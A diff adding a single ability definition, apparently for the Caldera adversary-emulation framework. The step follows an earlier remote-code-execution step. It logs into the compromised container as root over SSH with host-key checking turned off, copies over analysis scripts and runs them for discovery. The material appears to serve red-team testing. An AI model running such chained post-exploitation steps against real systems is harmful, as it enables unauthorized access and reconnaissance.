@@ -1,0 +1,35 @@
+- id: 20000000-0000-0000-0000-000000000204
+  name: KC2-204 - Container analysis
+  description: Container analysis of everything useful inside the PCF container before the patch attack.
+  tactic: discovery
+  technique:
+    attack_id: T1613
+    name: Container and Resource Discovery
+  repeatable: false
+  singleton: true
+  platforms:
+    linux:
+      sh:
+        command: |
+          ENTRY='#{host.kc2.entry}';
+          PREV='#{kc2.203.done}';
+          mkdir -p "$DATA_PATH/KC2";
+          TARGET_FILE="$DATA_PATH/KC2/attackaddr";
+          {
+            test -s "$TARGET_FILE" || {
+              echo "Missing KC2 attack address: $TARGET_FILE. Run step 202 and inspect $DATA_PATH/KC2/rce-attack.log.";
+              exit 1;
+            };
+            TARGET="$(cat "$TARGET_FILE")";
+            ssh -p 4222 -o StrictHostKeyChecking=no root@"$TARGET" 'rm -rf /tmp/caldera-kc4-analysis && mkdir -p /tmp/caldera-kc4-analysis';
+            tar -C /opt/caldera/KC4 -cf - container-analysis.sh container-analysis.d | ssh -p 4222 -o StrictHostKeyChecking=no root@"$TARGET" 'tar -C /tmp/caldera-kc4-analysis -xf -';
+            ssh -p 4222 -o StrictHostKeyChecking=no root@"$TARGET" 'bash /tmp/caldera-kc4-analysis/container-analysis.sh';
+          } > "$DATA_PATH/KC2/container-analysis.log" 2>&1 && echo kc2-204-done
+        timeout: 1800
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: kc2.204.done
+        cleanup: ''
+  requirements:
+  - plugins.stockpile.app.requirements.paw_provenance:
+    - source: host.kc2.entry
